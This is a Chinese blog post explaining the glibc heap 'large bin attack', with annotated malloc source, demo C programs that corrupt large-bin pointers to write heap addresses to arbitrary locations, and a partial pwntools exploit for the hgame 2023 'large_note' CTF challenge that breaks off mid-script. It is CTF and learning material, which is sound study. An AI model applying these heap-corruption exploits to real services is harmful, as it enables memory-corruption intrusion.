    <content type="html"><![CDATA[<p>还是hgame（让我们说谢谢hgame），之前学的时候有看到过这个攻击方式，当时觉得很鸡肋，现在啪啪打脸━((*′д｀)爻(′д｀*))━!!!!</p><span id="more"></span><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>large bin attack需要利用的是malloc里将chunk从unsorted bin摘除，放入large bin的过程，相关源码如下（ps：再放一遍largebin结构）（pps：chunk链的头结点的bk指向更大的chunk链的头节点，尾结点的fd指向更小的chunk链的头节点）：</p><img src="/2023/01/25/large-bin-attack/large_bin.jpg" class title="large_bin"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs c">      <span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br><span class="hljs-comment">//定位至unsorted bin的最后一个chunk一个个摘下直到unsorted bin没有chunk</span><br>        &#123;<br>          bck = victim-&gt;bk;<br><span class="hljs-comment">//筛去过大或过小的chunk</span><br>          <span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>            malloc_printerr (check_action, <span class="hljs-string">&quot;malloc(): memory corruption&quot;</span>,<br>                             chunk2mem (victim), av);<br>          size = chunksize (victim);<br><br>……<br><br><span class="hljs-comment">//从unsorted bin中摘下chunk的过程</span><br>          unsorted_chunks (av)-&gt;bk = bck;<br>          bck-&gt;fd = unsorted_chunks (av);<br><br>……<br><br>          <span class="hljs-keyword">if</span> (in_smallbin_range (size))<br>            &#123;<br>……<br>            &#125;<br><span class="hljs-comment">//放入large bin</span><br>          <span class="hljs-keyword">else</span><br>            &#123;<br><span class="hljs-comment">//计算index</span><br>              victim_index = largebin_index (size);<br><span class="hljs-comment">//bck定位至第一个chunk链（large bin数组）</span><br>              bck = bin_at (av, victim_index);<br><span class="hljs-comment">//fwd定位至第二个chunk链（最大的chunk链）</span><br>              fwd = bck-&gt;fd;<br><br>              <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>              <span class="hljs-keyword">if</span> (fwd != bck)<span class="hljs-comment">//非空</span><br>                &#123;<br>                  <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                  size |= PREV_INUSE;<br>                  <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (bck-&gt;bk-&gt;size))<br><span class="hljs-comment">//bck-&gt;bk定位至最后一个chunk链（最小的chunk链）</span><br><span class="hljs-comment">//如果victim比已有最小的chunk还小</span><br>                    &#123;<br><span class="hljs-comment">//fwd定位至第一个chunk链，bck定位至最后一个chunk链</span><br>                      fwd = bck;<br>                      bck = bck-&gt;bk;<br><br><span class="hljs-comment">//fd_nextsize指向最大的zhunk链，bk_nextsize指向最小的chunk链</span><br>                      victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br><span class="hljs-comment">//victim成为最小的chunk链和最大的chunk链连接</span><br><span class="hljs-comment">//原最小的chunk链和victim连接成为第二小的chunk链</span><br>                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                    &#125;<br>                  <span class="hljs-keyword">else</span><br>                    &#123;<br>                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br><span class="hljs-comment">//fwd从大到小移动直至小于等于victim</span><br>                      <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size)<br>                        &#123;<br>                          fwd = fwd-&gt;fd_nextsize;<br>                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                        &#125;<br><br><span class="hljs-comment">//如果vctim和fwd大小相等</span><br>                      <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br>                        <span class="hljs-comment">/* Always insert in the second position.  */</span><br><span class="hljs-comment">//fwd定位至该小chunk链的第二个chunk</span><br>                        fwd = fwd-&gt;fd;<br><span class="hljs-comment">//fwd是比victim小的最大的chunk链</span><br>                      <span class="hljs-keyword">else</span><br>                        &#123;<br><span class="hljs-comment">//chunk链连接同上</span><br>                          victim-&gt;fd_nextsize = fwd;<br>                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                          fwd-&gt;bk_nextsize = victim;<br>                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                        &#125;<br><span class="hljs-comment">//bck定位至比victim大的第一个chunk链</span><br>                      bck = fwd-&gt;bk;<br>                    &#125;<br>                &#125;<br>              <span class="hljs-keyword">else</span><br>                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>            &#125;<br><br><span class="hljs-comment">//fwd是victim的fd，bck是victim的bk</span><br>          mark_bin (av, victim_index);<br>          victim-&gt;bk = bck;<br>          victim-&gt;fd = fwd;<br>          fwd-&gt;bk = victim;<br>          bck-&gt;fd = victim;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_ITERS       10000</span><br>          <span class="hljs-keyword">if</span> (++iters &gt;= MAX_ITERS)<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br></code></pre></td></tr></table></figure><h1 id="利用一"><a href="#利用一" class="headerlink" title="利用一"></a>利用一</h1><p>这种利用方法利用的是第一个</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (bck-&gt;bk-&gt;size))<br></code></pre></td></tr></table></figure><p>实现效果任意地址写一个堆地址<br><a href="https://blog.csdn.net/qq_41252520/article/details/126211062">实验代码</a>如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">size_t</span> g_Target = <span class="hljs-number">0xABCDEF20220807</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span>* large_chunk1 = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x450</span>);<br>    <span class="hljs-type">char</span>* pad1 = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>    <span class="hljs-type">char</span>* large_chunk2 = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x440</span>);<br>    <span class="hljs-type">char</span>* pad2 = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-built_in">free</span>(large_chunk1);<br>    <span class="hljs-type">char</span>* pad3 = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br><br>    <span class="hljs-built_in">free</span>(large_chunk2);<br><br>    *(<span class="hljs-type">size_t</span>*)(large_chunk1+<span class="hljs-number">0x18</span>)=((<span class="hljs-type">size_t</span>)&amp;g_Target)<span class="hljs-number">-0x20</span>;<br>    <br>    <span class="hljs-type">char</span>* p1 = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><ul><li>先申请四个chunk，其中pad1、pad2用于隔离，防止合并</li><li>释放chunk1进入unsorted bin</li><li>申请pad3，unsorted bin中的chunk1放进large bin，此时chunk1的fd_nextsize和bk_nextsize都指向自己</li><li>释放chunk2，chunk2进入unsorted bin</li><li>更改chunk1的bk_nextsize为g_Target-0x20</li><li>申请一个chunk，chunk2进入large bin。由于chunk2小于chunk1，执行以下代码：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">victim_index = largebin_index (size);<br>bck = bin_at (av, victim_index);<br>fwd = bck-&gt;fd;<br><br>……<br><br>fwd = bck;<br>bck = bck-&gt;bk;<span class="hljs-comment">//chunk1</span><br><br>victim-&gt;fd_nextsize = fwd-&gt;fd;<br><span class="hljs-comment">//chunk2-&gt;fd_nextsize=chunk1</span><br>victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br><span class="hljs-comment">//chunk2-&gt;bk_nextsize=chunk1-&gt;bk_nextsize=g_Target-0x20</span><br>fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br><span class="hljs-comment">//chunk1-&gt;bk_nextsize=chunk2</span><br><span class="hljs-comment">//(g_Target-0x20)-&gt;fd_nextsize=*g_Target=chunk2</span><br></code></pre></td></tr></table></figure></li><li>更改成功<br>ps：示意图如下： <img src="/2023/01/25/large-bin-attack/1.jpg" class title="步骤一"><img src="/2023/01/25/large-bin-attack/2.jpg" class title="步骤二"><img src="/2023/01/25/large-bin-attack/3.jpg" class title="步骤三"></li></ul><h2 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h2><ul><li>malloc一块size1大小的large chunk（chunk1）</li><li>malloc一块随便大小的chunk（防止合并）</li><li>malloc一块size2大小的large chunk，要求size2&lt;size1且size1和size2在同一个large bin范围内</li><li>malloc一块随便大小的chunk（防止合并）</li><li>free（chunk1），chunk1进入unsorted bin</li><li>malloc一块size3的large chunk，要求size3&gt;size1（不触发分割），chunk1进入large bin</li><li>free（chunk2），chunk2进入unsorted bin</li><li>修改chunk1-&gt;bk_nextsize&#x3D;Target-0x20</li><li>malloc一块chunk（大小不等于size2），chunk2进入large bin，触发large bin attack</li></ul><h1 id="利用二"><a href="#利用二" class="headerlink" title="利用二"></a>利用二</h1><h2 id="2-30以前"><a href="#2-30以前" class="headerlink" title="2.30以前"></a>2.30以前</h2><p>这种方法利用的是第二个else，实现效果是任意地址写两个堆地址<br>实验代码如下（实验代码来源于how2heap代码，删除了一些输出）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;assert.h&gt;</span></span><br> <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var1 = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var2 = <span class="hljs-number">0</span>;<br><br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br> <br>    <span class="hljs-built_in">free</span>(p1);<br>    <span class="hljs-built_in">free</span>(p2);<br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br><br>    <span class="hljs-built_in">free</span>(p3);<br><br>    p2[<span class="hljs-number">-1</span>] = <span class="hljs-number">0x3f1</span>;<br>    p2[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    p2[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>    p2[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var1 - <span class="hljs-number">2</span>);<br>    p2[<span class="hljs-number">3</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var2 - <span class="hljs-number">4</span>);<br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="hljs-type">void</span> *)stack_var1);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="hljs-type">void</span> *)stack_var2);<br><br>    <span class="hljs-comment">// sanity check</span><br>    assert(stack_var1 != <span class="hljs-number">0</span>);<br>    assert(stack_var2 != <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>malloc一个size1的chunk（chunk1）</li><li>malloc随便一个chunk防止合并</li><li>malloc一个size2的chunk（chunk2），要求size1&lt;size2</li><li>malloc随便一个chunk防止合并</li><li>malloc一个size3的chunk（chunk3），要求size2&lt;size3且在一个large bin的范围内</li><li>malloc随便一个chunk防止合并</li><li>free掉chunk1和chunk2，进入unsorted bin</li><li>malloc一个size4的chunk，chunk1和chunk2先进入large bin，然后切割chunk1返回，剩下的chunk1_left被放入unsorted bin</li><li>free掉chunk3，chunk3放进unsorted bin</li><li>修改chunk2如下：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">修改前：<br>chunk2<br>size-&gt; size2<br>fd-&gt; large bin<br>bk-&gt; large bin<br>fd_nextsize-&gt; chunk2<br>bk_nextsize-&gt; chunk2<br><br>修改后：<br>chunk2<br>size-&gt; size2<br>fd-&gt; null<br>bk-&gt; target1<span class="hljs-number">-0x10</span><br>fd_nextsize-&gt; null<br>bk_nextsize-&gt; target2<span class="hljs-number">-0x20</span><br></code></pre></td></tr></table></figure></li><li>随便malloc一个chunk，chunk1_left进入small bin，chunk3放进large bin，然后从chunk1_left中切割返回（剩下的放进unsorted bin）<br>重点分析下chunk3放进large bin这一步：<br>由于size2&lt;size3，所以chunk3会插入chunk2和large bin中间，执行else中的第二个else部分代码（如下）：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c">victim_index = largebin_index (size);<br>bck = bin_at (av, victim_index);<span class="hljs-comment">//large bin</span><br>fwd = bck-&gt;fd;<span class="hljs-comment">//chunk2</span><br><br>……<br><br>victim-&gt;fd_nextsize = fwd;<br><span class="hljs-comment">//chunk3-&gt;fd_nextsize=chunk2</span><br>victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br><span class="hljs-comment">//chunk3-&gt;bk_nextsize=chunk2-&gt;bk_nextsize=target2-0x20</span><br>fwd-&gt;bk_nextsize = victim;<br><span class="hljs-comment">//chunk2-&gt;bk_nextsize=chunk3</span><br>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br><span class="hljs-comment">//chunk3-&gt;bk_nextsize-&gt;fd_nextsize=</span><br><span class="hljs-comment">//(target2-0x20)-&gt;fd_nextsize=chunk3</span><br><span class="hljs-comment">//target2=chunk3</span><br>bck = fwd-&gt;bk;<br><span class="hljs-comment">//bck=chunk2-&gt;bk=target1-0x10</span><br><br>……<br><br>mark_bin (av, victim_index);<br>victim-&gt;bk = bck;<br><span class="hljs-comment">//chunk3-&gt;bk=target1-0x10</span><br>victim-&gt;fd = fwd;<br><span class="hljs-comment">//chunk3-&gt;fd=chunk2</span><br>fwd-&gt;bk = victim;<br><span class="hljs-comment">//chunk2-&gt;bk=chunk3</span><br>bck-&gt;fd = victim;<br><span class="hljs-comment">//(target1-0x10)-&gt;fd=chunk3</span><br><span class="hljs-comment">//target1=chunk3</span><br></code></pre></td></tr></table></figure></li><li>更改成功<br>ps：示意图如下：<img src="/2023/01/25/large-bin-attack/%E6%9B%B4%E6%94%B9%E5%89%8D.jpg" class title="更改前"><img src="/2023/01/25/large-bin-attack/%E6%9B%B4%E6%94%B9%E5%90%8E.jpg" class title="更改后"><img src="/2023/01/25/large-bin-attack/1-1.jpg" class title="2步骤一"><img src="/2023/01/25/large-bin-attack/1-2.jpg" class title="2步骤二"><img src="/2023/01/25/large-bin-attack/1-3.jpg" class title="2步骤三"><img src="/2023/01/25/large-bin-attack/1-4.jpg" class title="2步骤四"></li></ul><h3 id="利用步骤-1"><a href="#利用步骤-1" class="headerlink" title="利用步骤"></a>利用步骤</h3><ul><li>malloc一个size1的chunk（chunk1）</li><li>malloc随便一个chunk防止合并</li><li>malloc一个size2的chunk（chunk2），要求size1&lt;size2</li><li>malloc随便一个chunk防止合并</li><li>malloc一个size3的chunk（chunk3），要求size2&lt;size3且在一个large bin的范围内</li><li>malloc随便一个chunk防止合并</li><li>free掉chunk1和chunk2</li><li>malloc一个size4的chunk，要求size1-size4属于small bin</li><li>free掉chunk3</li><li>修改chunk2如下：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">chunk2<br>size-&gt; size2<br>fd-&gt; null<br>bk-&gt; target1<span class="hljs-number">-0x10</span><br>fd_nextsize-&gt; null<br>bk_nextsize-&gt; target2<span class="hljs-number">-0x20</span><br></code></pre></td></tr></table></figure></li><li>随便malloc一个chunk，size&lt;size1-size4，触发large bin attack</li></ul><h2 id="2-30以后"><a href="#2-30以后" class="headerlink" title="2.30以后"></a>2.30以后</h2><p>增加检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))<br>malloc_printerr (<span class="hljs-string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);<br><br>……<br><br><span class="hljs-keyword">if</span> (bck-&gt;fd != fwd)<br>malloc_printerr (<span class="hljs-string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);<br></code></pre></td></tr></table></figure><p>利用二不成立了，只能使用利用一</p><h1 id="例题hgame-2023-week3-large-note"><a href="#例题hgame-2023-week3-large-note" class="headerlink" title="例题hgame 2023 week3 large_note"></a>例题hgame 2023 week3 large_note</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>看到这个名字第一反应就是large bin attack，但参见上文↑，我一直觉得这个漏洞很鸡肋不知道怎么用。直到我半夜搜到👉<a href="https://blog.csdn.net/qq_33590156/article/details/121716696">这个</a>👈<br>这道题最大的问题就是申请的chunk过大不在tcache的范围内，不能uaf。但large bin attack可以在tcache_max_bin处写下大至，使得更大的chunk能够放进tcache就可以uaf了（tcache_max_bin在mp_+80的地方，本身值为0x40），具体操作见上<br>之后步骤同safe_note</p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pack</span>(<span class="hljs-params">pos, ptr</span>):<br>    <span class="hljs-keyword">return</span> (pos &gt;&gt; <span class="hljs-number">12</span>) ^ ptr<br><br><span class="hljs-comment">#p=process(&#x27;./large&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;week-3.hgame.lwsec.cn&#x27;</span>,<span class="hljs-number">30719</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br>libc=ELF(<span class="hljs-string">&#x27;./2.32-0ubuntu3.2_amd64/libc-2.32.so&#x27;</span>)<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x510</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x510</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x500</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x500</span>)<br>delete(<span class="hljs-number">0</span>)<br>edit(<span 